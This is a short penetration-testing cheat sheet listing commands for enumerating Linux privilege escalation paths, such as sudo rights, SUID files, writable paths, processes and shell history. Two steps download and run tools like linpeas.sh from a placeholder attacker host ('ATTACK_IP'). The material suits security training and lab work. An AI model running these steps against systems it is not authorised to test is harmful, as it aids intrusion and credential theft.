# Local Privilege Escalation LPE Enumeration Methodology

### 1) Linux Local Privilege Escalation LPE Enumeration

On a linux machine, we can do some checks to see if we can exploit them to do lateral movement, or even root the machine.

#### Checks:

1) Sudo privileges (Authenticated)

       sudo -l

2) SUID bit files

        find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null	

3) Open ports/services/applications within the machine

        ss -tulpn
        netstat -ano

4) Check for running processes either as root, or as another target user for lateral movement

        wget http://ATTACK_IP:PORT/pspy64

        chmod +x ./pspy64

        ./pspy64

5) Check detailed contents of a directory like hidden files, file size, ownership

        ls -lah

6) Automated Enumeration

        wget http://ATTACK_IP:PORT/linpeas.sh

        chmod +x ./linpeas.sh

        ./linpeas.sh

7) Interesting groups of the current user

        id

8) Environment Variables

        env

9) Command history

        history

        cat /home/user/.bash_history

11) Writeable files and directories of the current user

        find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

12) Chech the current user's PATH variable contents

        echo $PATH

13) World-writeable files and directories

        find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
        find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

